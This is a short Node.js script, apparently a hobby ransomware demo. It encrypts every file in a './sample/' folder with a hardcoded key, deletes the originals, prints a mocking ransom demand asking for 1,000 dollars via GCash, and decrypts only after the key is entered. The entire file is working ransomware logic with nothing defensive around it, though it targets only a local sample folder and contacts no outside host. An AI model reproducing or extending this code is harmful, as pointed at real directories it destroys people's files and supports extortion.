const encryptor = require('file-encryptor');
const fs = require('fs');
const readlineSync = require('readline-sync');

const encryptionKey = 'bonx';
const testFolder = './sample/';

(async () => {

    const files = fs.readdirSync(testFolder);

    for (const file of files) {

        await new Promise((resolve, reject) => {
            encryptor.encryptFile(`${testFolder}/${file}`, `${testFolder}/${file}.encrypted`, encryptionKey, async function(err) {
                if (err) {
                    reject(err);
                } else {
                    await fs.unlinkSync(`${testFolder}/${file}`);
                    console.log(`File ${testFolder}/${file} is encrypted! hahaha`);
                    resolve();
                }
            });
        });
    }

    console.log('Uda na, na hack na, bayad 1k dollars to retrieve your files. send via gcash:09090909090')

    let decryptionKey;
    let decryptSuccess = false;

    while (!decryptSuccess) {

        decryptionKey = readlineSync.question('ENTER DECRYPTION KEY: ');

        if (decryptionKey === encryptionKey) {
            decryptSuccess = true;
        } else {
            console.log("incorrect Key. try again.");
        }
    }

    const encryptedFiles = fs.readdirSync(testFolder);

    for (const file of encryptedFiles) {

        await new Promise((resolve, reject) => {
            encryptor.decryptFile(`${testFolder}/${file}`, `${testFolder}/${file.replace('.encrypted', '')}`, encryptionKey, async function(err) {
                if (err) {
                    reject(err);
                } else {
                    await fs.unlinkSync(`${testFolder}/${file}`);
                    console.log(`File ${testFolder}/${file} is decrypted! sheesh`);
                    resolve();
                }
            });
        });
    }
})();
